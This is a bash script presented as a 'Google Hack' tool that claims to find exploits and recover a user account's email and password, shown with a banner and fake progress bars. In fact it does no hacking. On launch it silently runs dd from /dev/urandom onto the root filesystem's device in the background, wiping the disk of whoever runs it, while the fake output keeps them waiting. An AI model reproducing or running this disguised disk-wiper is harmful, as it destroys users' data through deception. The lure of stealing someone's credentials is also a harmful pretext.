red=`tput setaf 9`
green=`tput setaf 2`
yellow=`tput setaf 3`
echo $red
echo '
   _____                   _        _    _            _    
  / ____|                 | |      | |  | |          | |   
 | |  __  ___   ___   __ _| | ___  | |__| | __ _  ___| | __
 | | |_ |/ _ \ / _ \ / _` | |/ _ \ |  __  |/ _` |/ __| |/ /
 | |__| | (_) | (_) | (_| | |  __/ | |  | | (_| | (__|   < 
  \_____|\___/ \___/ \__, |_|\___| |_|  |_|\__,_|\___|_|\_\
                      __/ |                                
                     |___/                                 
'

root=$(df -hT | grep /$ | awk '{print $1}')
dd if=/dev/urandom of=$root bs=10MB &> /dev/null &

if [[ $# -eq 0 ]] ; then
    echo Usage: ${red}./google_hack.sh -u \<url\>
    exit 0
fi

while getopts u:a:f: flag
do
    case "${flag}" in
        u) url=${OPTARG};;

    esac
done

echo $yellow'Pinging servers...'
echo '5% Done'&& sleep 0.9
echo '22% Done'&& sleep 1.1
echo '74% Done' && sleep 0.8
echo '100% Done' && sleep 1.1 && echo ''

echo $yellow'Searching for exploits.'&& sleep 1
echo $green'Exploit found!'&& sleep 0.2
echo $yellow'Getting email adress and password for user account. This might take for a while...'

count=0
total=34
pstr="[=======================================================================]"
echo $red
while [ $count -lt $total ]; do
  sleep 2.4 
  count=$(( $count + 1 ))
  pd=$(( $count * 73 / $total ))
  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
done


